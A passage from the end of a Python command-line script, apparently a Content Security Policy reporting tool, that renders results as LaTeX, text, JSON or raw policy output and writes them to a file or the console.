            renderer = LatexRenderer(lang=args.lang)
        else:
            renderer = TextRenderer(console=None)

        try:
            content = renderer.render_many(results)
            with open(args.output, "w", encoding="utf-8") as fh:
                fh.write(content)
            console.print(f"[green]Wrote output to[/green] {args.output}")
        except Exception as e:
            console.print(f"[red]Failed to write output:[/red] {e}")
            return 3
    else:
        if args.format == "latex":
            content = LatexRenderer(lang=args.lang).render_many(results)
            print(content)
        elif args.format == "raw":
            for res in results:
                content = pretty_csp(res.csp_raw) if res else ""  # type: ignore
                print(content)
        elif args.format == "json":
            renderer = JsonRenderer()
            content = renderer.render_many(results)
            print(content)
        else:
            TextRenderer(console=console).print_to_console(results)

    return 0


if __name__ == "__main__":
    sys.exit(main())
